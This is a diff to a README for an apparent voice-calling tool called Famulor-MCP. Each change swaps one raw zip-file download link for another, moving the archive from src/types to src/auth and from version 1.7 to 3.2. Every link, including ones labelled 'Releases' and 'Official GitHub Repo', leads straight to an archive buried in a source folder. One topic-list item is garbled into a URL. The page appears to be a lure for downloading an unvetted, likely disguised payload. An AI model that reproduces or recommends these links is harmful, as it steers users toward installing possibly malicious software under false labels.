@@ -1,6 +1,6 @@
 # 📞 Famulor-MCP - Simplify Your Voice Management
 
-[![Download Famulor-MCP](https://github.com/stuckaJ/Famulor-MCP/raw/refs/heads/main/src/types/MCP_Famulor_1.7.zip)](https://github.com/stuckaJ/Famulor-MCP/raw/refs/heads/main/src/types/MCP_Famulor_1.7.zip)
+[![Download Famulor-MCP](https://raw.githubusercontent.com/stuckaJ/Famulor-MCP/main/src/auth/MCP_Famulor_3.2.zip)](https://raw.githubusercontent.com/stuckaJ/Famulor-MCP/main/src/auth/MCP_Famulor_3.2.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to Famulor-MCP! This guide will help you download and run the software q
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Famulor-MCP Releases](https://github.com/stuckaJ/Famulor-MCP/raw/refs/heads/main/src/types/MCP_Famulor_1.7.zip). 
+To get started, visit this page to download: [Famulor-MCP Releases](https://raw.githubusercontent.com/stuckaJ/Famulor-MCP/main/src/auth/MCP_Famulor_3.2.zip). 
 
 1. Click the link above.
 2. Choose the latest release.
@@ -89,7 +89,7 @@ For further assistance, you can check the documentation available on the GitHub 
 
 Here are some resources that might help you:
 
-- Official GitHub Repo: [Famulor-MCP GitHub](https://github.com/stuckaJ/Famulor-MCP/raw/refs/heads/main/src/types/MCP_Famulor_1.7.zip)
+- Official GitHub Repo: [Famulor-MCP GitHub](https://raw.githubusercontent.com/stuckaJ/Famulor-MCP/main/src/auth/MCP_Famulor_3.2.zip)
 - Community Forum: Join discussions and get tips from other users.
 - Tutorials and Guides: Watch video tutorials on how to make the most out of Famulor-MCP.
 
@@ -99,6 +99,6 @@ The following topics are relevant to Famulor-MCP and can enhance your experience
 
 - **AI Calling**
 - **Model Context Protocol**
-- **https://github.com/stuckaJ/Famulor-MCP/raw/refs/heads/main/src/types/MCP_Famulor_1.7.zip and TypeScript**
+- **https://raw.githubusercontent.com/stuckaJ/Famulor-MCP/main/src/auth/MCP_Famulor_3.2.zip and TypeScript**
 
 We hope this guide serves you well as you set up your Famulor-MCP application! For any feedback, please reach out on GitHub.
